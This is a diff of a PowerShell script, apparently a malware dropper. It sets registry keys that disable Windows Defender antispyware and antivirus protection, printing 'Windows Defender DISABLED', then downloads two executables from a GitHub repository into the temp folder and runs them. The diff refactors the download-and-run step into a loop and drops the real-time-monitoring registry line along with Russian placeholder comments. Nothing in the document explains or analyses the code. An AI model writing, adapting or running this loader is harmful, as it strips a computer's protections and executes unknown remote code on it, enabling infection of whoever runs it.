@@ -27,7 +27,6 @@ $SpynetKey = "Spynet"
 
 $DisableAntiSpywareValue = "DisableAntiSpyware"
 $DisableAntiVirusValue = "DisableAntiVirus"
-$DisableRealtimeMonitoringValue = "DisableRealtimeMonitoring"
 
 if (!(Test-Path $DefenderPath)) { New-Item -Path $DefenderPath -Force }
 New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force
@@ -36,44 +35,30 @@ New-Item -Path "$DefenderPath\$SpynetKey" -Force
 
 New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiSpywareValue" -Value "1" -PropertyType Dword -Force
 New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiVirusValue" -Value "1" -PropertyType Dword -Force
-New-ItemProperty -Path "$DefenderPath" -Name "$DisableRealtimeMonitoringValue" -Value "1" -PropertyType Dword -Force
 
 Write-Host "Windows Defender DISABLED" -ForegroundColor Green
 
-# ===== ПОМЕНЯЙ ЭТИ ИМЕНА НА ТЕ, ЧТО РЕАЛЬНО ЛЕЖАТ В ТВОЁМ РЕПОЗИТОРИИ =====
-$fileName1 = "proga1.exe"   # <-- ЗАМЕНИТЬ
-$fileName2 = "proga2.exe"   # <-- ЗАМЕНИТЬ
-# ========================================================================
-
+# Download and run proga1.exe and proga2.exe
 $tempFolder = [System.IO.Path]::GetTempPath()
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $baseUrl = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/"
-$url1 = $baseUrl + $fileName1
-$url2 = $baseUrl + $fileName2
-
-$dest1 = Join-Path $tempFolder "Program1.exe"
-$dest2 = Join-Path $tempFolder "Program2.exe"
+$files = @("proga1.exe", "proga2.exe")
 
 $wc = New-Object System.Net.WebClient
 $wc.Headers.Add("User-Agent", "Mozilla/5.0")
 
-Write-Host "Downloading FIRST: $fileName1" -ForegroundColor Yellow
-try {
-    $wc.DownloadFile($url1, $dest1)
-    Write-Host "Running FIRST" -ForegroundColor Green
-    Start-Process -FilePath $dest1
-} catch {
-    Write-Host "FIRST failed: $_" -ForegroundColor Red
-}
-
-Write-Host "Downloading SECOND: $fileName2" -ForegroundColor Yellow
-try {
-    $wc.DownloadFile($url2, $dest2)
-    Write-Host "Running SECOND" -ForegroundColor Green
-    Start-Process -FilePath $dest2
-} catch {
-    Write-Host "SECOND failed: $_" -ForegroundColor Red
+foreach ($file in $files) {
+    $url = $baseUrl + $file
+    $dest = Join-Path $tempFolder $file
+    Write-Host "Downloading $file..." -ForegroundColor Yellow
+    try {
+        $wc.DownloadFile($url, $dest)
+        Write-Host "Running $file" -ForegroundColor Green
+        Start-Process -FilePath $dest
+    } catch {
+        Write-Host "Failed: $file - $_" -ForegroundColor Red
+    }
 }
 
 Write-Host "ALL DONE" -ForegroundColor Green
